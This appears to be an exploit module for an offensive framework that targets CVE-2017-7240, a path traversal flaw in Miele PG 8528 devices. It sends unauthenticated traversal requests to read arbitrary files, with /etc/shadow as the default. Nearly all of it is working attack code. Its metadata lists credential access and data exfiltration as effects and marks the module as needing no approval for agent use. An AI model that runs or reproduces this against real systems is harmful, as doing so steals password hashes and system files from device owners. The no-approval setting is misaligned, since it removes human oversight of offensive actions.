#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Miele Professional PG 8528 Path Traversal"""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client



class Module(Auxiliary, Http_client):
    __info__ = {
        'name': 'Miele Professional PG 8528 Path Traversal',
        'description': 'Module exploits Miele Professional PG 8528 Path Traversal vulnerability which allows to read any file on the system.',
        'author': ['Jens Regel, Schneider & Wulf EDV-Beratung GmbH & Co. KG', 'Marcin Bury'],
        'cve': ['CVE-2017-7240'],
        'platform': Platform.LINUX,
        'references': ['https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7240', 'https://www.exploit-db.com/exploits/41718/'],
        'tags': ['iot', 'embedded', 'lfi', 'unauth', 'cve-2017-7240', 'auxiliary'],
        'agent': {
            'risk': 'active',
            'effects': ['credential_access', 'data_exfiltration'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['credentials', 'risk_signals'],
        },
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")
    filename = OptString("/etc/shadow", "File to read from filesystem")

    def run(self):
        if self.check():
            path = "/../../../../../../../../../../../..{}".format(self.filename)

            response = self.http_request(
                method="GET",
                path=path
            )

            if response is None:
                return

            if response.status_code == 200 and response.text:
                print_success("Success! File: %s" % self.filename)
                print_info(response.text)
            else:
                print_error("Exploit failed")
        else:
            print_error("Device seems to be not vulnerable")
    def check(self):
        response = self.http_request(
            method="GET",
            path="/../../../../../../../../../../../../etc/shadow"
        )

        if response and ("/etc/shadow" in (response.text or '')):
            return True  # target vulnerable

        return False  # target is not vulnerable
